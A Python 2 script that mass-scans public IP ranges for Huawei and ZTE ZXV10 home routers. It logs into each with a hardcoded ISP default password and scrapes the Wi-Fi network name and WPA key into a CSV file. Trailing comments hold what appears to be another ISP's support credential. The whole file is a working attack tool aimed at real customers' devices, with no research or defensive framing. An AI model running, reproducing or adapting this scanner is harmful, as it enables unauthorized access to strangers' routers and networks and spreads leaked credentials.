# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
w3 = 0
wei = 0
w3e = 0
##http://190.25.128.219/
etb = open("etb.csv", "w")
for i in range(185,192):
    i=i+1
    c=str(i)
    for j in range(28,86):
        j=j+1
        l=str(j)
        for p in range(183,255):
            p=p+1
            m=str(p)
            for a in range(0,255):
                a=a+1
                g=str(a)
                
                h=c+"."+l+"."+m+"."+g
                
                try:
                    r = requests.get('http://'+str(h)+':80/', timeout=0.3)
                    head = r.headers
                    b= 'WWW-Authenticate' in head
                    
                    if b==True:
                        huawei = 'Basic realm="Home Gateway"'
                        w300 = 'Basic realm="ZXV10 W300"'
                        w300e = 'Basic realm="ZXV10 W300E"'
                        r1 = requests.get('http://'+h+':80/', timeout=0.6)
                        n = r1.headers['WWW-Authenticate']
                        if n==huawei: 
                            r2 = requests.get('http://'+h+':80/home_wlan.html', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=0.6)
                            parser1 = r2.content
                            bs1=BeautifulSoup(parser1, "html.parser")
                            print 'ok........huawei.............'+str(h)
                            for ssid in bs1.find_all("input", {"name":"ESSID"}):
                                for pss in bs1.find_all("input", {"name":"PreSharedKey"}):
                                    wei = wei + 1
                                    print str(h)+".....Huawei......."+str(ssid["value"])+"....."+str(pss["value"])
                                    etb.write(h+','+'Huawei,'+str(ssid["value"])+','+str(pss["value"]+',\n')
                                    
                        if n==w300:
                            
                            r3 = requests.get('http://'+h+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=0.6)
                            parser2 = r3.content
                            bs2=BeautifulSoup(parser2, "html.parser")
                            print 'ok..........w300...........'+str(h)
                            for name in bs2.find_all("input", {"name":"ESSID"}):
                                for key in bs2.find_all("input", {"name":"PreSharedKey"}): 
                                    w3 = w3 + 1
                                    print str(h)+".....w300......."+str(name["value"])+"....."+str(key["value"])
                                    etb.write(h+','+'W300,'+str(name["value"])+','+str(key["value"]+',\n')
                                              
                        elif n==w300e:
                            
                            r4 = requests.get('http://'+h+':80/basic/home_wlan.htm', auth=HTTPBasicAuth('Customer', 'ClienteETB2006'), timeout=0.6)
                            parser3 = r4.content
                            bs3=BeautifulSoup(parser3, "html.parser")
                            print 'ok..........w300e...........'+str(h)
                            for name in bs3.find_all("input", {"name":"ESSID"}):
                                for key in bs3.find_all("input", {"name":"PreSharedKey"}):
                                    w3e = w3e + 1                                    
                                    print str(h)+".....w300e......."+str(name["value"])+"....."+str(key["value"])
                                    etb.write(h+','+'W300e,'+str(name["value"])+','+str(key["value"]+',\n')
                                
                        else:
                            pass
                        
            
                except requests.exceptions.ConnectTimeout:
                    pass
                except requests.exceptions.ReadTimeout:
                    pass
                except requests.exceptions.ConnectionError:
                    pass
                except KeyError:
                    pass

print str(w3)+" routers w300 encontrados"
print str(w3e)+" routers w300e encontrados"
print str(wei)+" routers huawei encontrados"
print str(w3 + w3e + wei)+" En total"

                    


##emcali
#soporte
#@1GV)Z<!